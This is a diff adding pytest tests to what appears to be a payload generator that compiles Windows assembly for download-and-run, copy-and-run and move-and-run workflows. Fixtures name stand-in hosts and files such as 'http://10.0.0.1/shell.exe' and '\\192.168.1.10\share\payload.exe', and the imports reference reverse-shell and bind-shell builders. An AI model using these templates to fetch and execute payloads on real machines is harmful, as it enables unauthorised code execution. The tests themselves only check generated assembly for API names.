@@ -19,19 +19,25 @@ from emitrion.workflow.reference import (
     IRCheckPathTemplate,
     IRCopyFileTemplate,
     IRCopyThenRunTemplate,
+    IRCopyToUserdirTemplate,
     IRGetUsernameTemplate,
     IRHttpDownloadTemplate,
+    IRHttpDownloadToUserdirTemplate,
     IRMoveFileTemplate,
     IRMoveThenRunTemplate,
+    IRMoveToUserdirTemplate,
     WorkflowTemplate,
     build_bind_shell_workflow,
     build_check_path_workflow,
     build_copy_file_workflow,
     build_copy_then_run_workflow,
+    build_copy_to_userdir_workflow,
     build_get_username_workflow,
+    build_http_download_to_userdir_workflow,
     build_http_download_workflow,
     build_move_file_workflow,
     build_move_then_run_workflow,
+    build_move_to_userdir_workflow,
     build_reverse_shell_workflow,
     build_run_command_workflow,
 )
@@ -1444,3 +1450,387 @@ class TestCallBufferLowering:
         asm = lower_workflow(w, layout, {0x00})
         assert "jmp  eax" in asm
         assert "wf_entry:" in asm
+
+
+# ---------------------------------------------------------------------------
+# Copy to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+class TestCopyToUserdirWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_copy_to_userdir_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_copy_to_userdir_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "build_path" in names
+        assert "use_path" in names
+        assert "run_payload" in names
+        assert "success" in names
+        assert "fail" in names
+
+    def test_workflow_with_custom_params(self):
+        from emitrion.workflow.validator import validate
+        w = build_copy_to_userdir_workflow(
+            src_path=r"C:\temp\evil.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\AppData\Local\evil.exe",
+        )
+        result = validate(w)
+        assert result.valid, result.errors
+
+
+class TestCopyToUserdirTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRCopyToUserdirTemplate()
+        config = TemplateConfig(
+            src_path=r"\\server\share\p.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\p.exe",
+        )
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "lstrcpyA" in slots
+        assert "lstrcatA" in slots
+        assert "CopyFileA" in slots
+        assert "WinExec" in slots
+        assert "LoadLibraryA" in slots
+
+    def test_probe_slots_finds_structs(self):
+        tmpl = IRCopyToUserdirTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "username_buf" in slots
+        assert "dest_path_buf" in slots
+
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRCopyToUserdirTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "advapi_dll" in slots
+        assert "path_prefix" in slots
+        assert "path_suffix" in slots
+        assert "src_path" in slots
+
+    def test_cheatsheet(self):
+        tmpl = IRCopyToUserdirTemplate()
+        config = TemplateConfig(
+            src_path=r"\\srv\s\p.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\p.exe",
+        )
+        sheet = tmpl.cheatsheet(config)
+        labels = [s[0] for s in sheet]
+        assert "Source path" in labels
+        assert "Destination pattern" in labels
+
+
+class TestCopyToUserdirLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            src_path=r"\\192.168.1.10\share\payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "copy_to_userdir.yaml"),
+            template_name="ir_copy_to_userdir",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_build_path:" in lowered_asm
+        assert "wf_use_path:" in lowered_asm
+        assert "wf_run_payload:" in lowered_asm
+
+    def test_contains_getusername_call(self, lowered_asm):
+        assert "GetUserNameA" in lowered_asm
+
+    def test_contains_lstrcpy_lstrcata(self, lowered_asm):
+        assert "lstrcpyA" in lowered_asm
+        assert "lstrcatA" in lowered_asm
+
+    def test_contains_copyfile_call(self, lowered_asm):
+        assert "CopyFileA" in lowered_asm
+
+    def test_contains_winexec_call(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+    def test_contains_loadlibrary_for_advapi(self, lowered_asm):
+        assert "LoadLibraryA" in lowered_asm
+
+
+class TestCopyToUserdirEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            src_path=r"\\192.168.1.10\share\payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "copy_to_userdir.yaml"),
+            template_name="ir_copy_to_userdir",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "GetUserNameA" in result.contract_md
+        assert "CopyFileA" in result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# Move to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+class TestMoveToUserdirWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_move_to_userdir_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_move_to_userdir_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "build_path" in names
+        assert "use_path" in names
+        assert "run_payload" in names
+
+    def test_workflow_with_custom_params(self):
+        from emitrion.workflow.validator import validate
+        w = build_move_to_userdir_workflow(
+            src_path=r"C:\temp\evil.exe",
+            path_suffix=r"\AppData\Local\evil.exe",
+        )
+        result = validate(w)
+        assert result.valid, result.errors
+
+
+class TestMoveToUserdirTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRMoveToUserdirTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "lstrcpyA" in slots
+        assert "lstrcatA" in slots
+        assert "MoveFileA" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_structs(self):
+        tmpl = IRMoveToUserdirTemplate()
+        config = TemplateConfig()
+        slots = tmpl.probe_slots(config)
+        assert "username_buf" in slots
+        assert "dest_path_buf" in slots
+
+    def test_cheatsheet(self):
+        tmpl = IRMoveToUserdirTemplate()
+        config = TemplateConfig()
+        sheet = tmpl.cheatsheet(config)
+        labels = [s[0] for s in sheet]
+        assert any("moved" in l.lower() or "source" in l.lower() for l in labels)
+
+
+class TestMoveToUserdirLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            src_path=r"\\192.168.1.10\share\payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "move_to_userdir.yaml"),
+            template_name="ir_move_to_userdir",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_build_path:" in lowered_asm
+        assert "wf_use_path:" in lowered_asm
+
+    def test_contains_getusername_call(self, lowered_asm):
+        assert "GetUserNameA" in lowered_asm
+
+    def test_contains_movefile_call(self, lowered_asm):
+        assert "MoveFileA" in lowered_asm
+
+    def test_contains_lstrcpy_lstrcata(self, lowered_asm):
+        assert "lstrcpyA" in lowered_asm
+        assert "lstrcatA" in lowered_asm
+
+    def test_contains_winexec_call(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+
+class TestMoveToUserdirEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            src_path=r"\\192.168.1.10\share\payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "move_to_userdir.yaml"),
+            template_name="ir_move_to_userdir",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "MoveFileA" in result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# HTTP download to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+class TestHttpDownloadToUserdirWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_http_download_to_userdir_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_expected_blocks(self):
+        w = build_http_download_to_userdir_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "build_path" in names
+        assert "use_path" in names
+        assert "open_url" in names
+        assert "alloc_buffer" in names
+
+    def test_workflow_with_custom_params(self):
+        from emitrion.workflow.validator import validate
+        w = build_http_download_to_userdir_workflow(
+            url="http://10.0.0.1/shell.exe",
+            path_suffix=r"\Downloads\shell.exe",
+        )
+        result = validate(w)
+        assert result.valid, result.errors
+
+
+class TestHttpDownloadToUserdirTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRHttpDownloadToUserdirTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "lstrcpyA" in slots
+        assert "lstrcatA" in slots
+        assert "InternetOpenA" in slots
+        assert "InternetOpenUrlA" in slots
+        assert "InternetReadFile" in slots
+        assert "CreateFileA" in slots
+        assert "WriteFile" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_structs(self):
+        tmpl = IRHttpDownloadToUserdirTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe")
+        slots = tmpl.probe_slots(config)
+        assert "username_buf" in slots
+        assert "dest_path_buf" in slots
+
+    def test_cheatsheet(self):
+        tmpl = IRHttpDownloadToUserdirTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/p.exe")
+        sheet = tmpl.cheatsheet(config)
+        labels = [s[0] for s in sheet]
+        assert any("url" in l.lower() or "download" in l.lower() for l in labels)
+
+
+class TestHttpDownloadToUserdirLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "http_download_to_userdir.yaml"),
+            template_name="ir_http_download_to_userdir",
+            config=config,
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_build_path:" in lowered_asm
+        assert "wf_use_path:" in lowered_asm
+
+    def test_contains_getusername_call(self, lowered_asm):
+        assert "GetUserNameA" in lowered_asm
+
+    def test_contains_lstrcpy_lstrcata(self, lowered_asm):
+        assert "lstrcpyA" in lowered_asm
+        assert "lstrcatA" in lowered_asm
+
+    def test_contains_internet_apis(self, lowered_asm):
+        assert "InternetOpenA" in lowered_asm
+        assert "InternetOpenUrlA" in lowered_asm
+        assert "InternetReadFile" in lowered_asm
+
+    def test_contains_file_write_apis(self, lowered_asm):
+        assert "CreateFileA" in lowered_asm
+        assert "WriteFile" in lowered_asm
+
+    def test_contains_winexec(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+    def test_contains_loadlibrary(self, lowered_asm):
+        assert "LoadLibraryA" in lowered_asm
+
+
+class TestHttpDownloadToUserdirEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path):
+        from emitrion.build import build
+        config = TemplateConfig(
+            url="http://192.168.1.10/payload.exe",
+            path_prefix=r"C:\Users" + "\\",
+            path_suffix=r"\Desktop\payload.exe",
+        )
+        result = build(
+            str(manifest_dir / "http_download_to_userdir.yaml"),
+            template_name="ir_http_download_to_userdir",
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert "main:" in result.asm
+        assert result.contract_md
+        assert "GetUserNameA" in result.contract_md
+        assert "InternetOpenA" in result.contract_md
